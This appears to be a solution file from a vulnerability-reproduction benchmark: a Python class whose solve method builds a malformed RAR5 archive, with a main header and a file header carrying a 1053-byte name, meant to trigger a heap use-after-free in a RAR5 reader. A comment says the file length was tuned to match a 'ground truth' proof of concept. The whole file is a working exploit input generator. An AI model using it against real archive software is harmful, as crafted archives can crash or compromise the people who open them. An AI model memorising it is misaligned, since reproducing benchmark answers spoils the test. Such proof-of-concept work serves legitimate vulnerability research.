import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in RAR5 reader.
        The vulnerability involves reading the name size, allocating memory, reading the name,
        and then checking the size, potentially leading to UAF in error handling.
        """
        # RAR5 Signature: Rar!\x1a\x07\x01\x00
        signature = b'\x52\x61\x72\x21\x1A\x07\x01\x00'
        
        def to_vint(val):
            out = bytearray()
            while True:
                byte = val & 0x7F
                val >>= 7
                if val > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)
            
        def make_block(h_type, h_flags, fields):
            # Header structure: CRC32(4) | Size(VINT) | Type(VINT) | Flags(VINT) | Fields
            # Size covers: Type + Flags + Fields
            # CRC covers: Size + Type + Flags + Fields
            
            body_no_size = to_vint(h_type) + to_vint(h_flags) + fields
            size_val = len(body_no_size)
            size_vint = to_vint(size_val)
            
            data_to_crc = size_vint + body_no_size
            crc = zlib.crc32(data_to_crc) & 0xFFFFFFFF
            
            return struct.pack('<I', crc) + data_to_crc

        # 1. Main Header (Type 1)
        # Minimal fields: Extra Area Size (0), Archive Flags (0)
        # Type: 1, Flags: 0
        mh_fields = to_vint(0) + to_vint(0)
        main_header = make_block(1, 0, mh_fields)
        
        # 2. File Header (Type 2)
        # We target a specific length (1089 bytes total PoC) to match ground truth.
        # Signature (8) + Main Header (9) = 17 bytes.
        # Remaining for File Header = 1072 bytes.
        # File Header Overhead (excluding name):
        # CRC(4) + Size(2) + Type(1) + Flags(1) + FixedFields(9) + NameSize(2) = 19 bytes.
        # Required Name Length = 1072 - 19 = 1053 bytes.
        
        name_len = 1053
        name_bytes = b'A' * name_len
        
        fh_fields = bytearray()
        fh_fields += to_vint(0)                 # Extra Area Size
        fh_fields += to_vint(0)                 # Data Size
        fh_fields += to_vint(0)                 # File Attributes
        fh_fields += to_vint(0)                 # Host OS
        fh_fields += struct.pack('<I', 0)       # File CRC32 (4 bytes)
        fh_fields += to_vint(0)                 # Compression Info
        fh_fields += to_vint(name_len)          # Name Size
        fh_fields += name_bytes                 # Name
        
        file_header = make_block(2, 0, bytes(fh_fields))
        
        return signature + main_header + file_header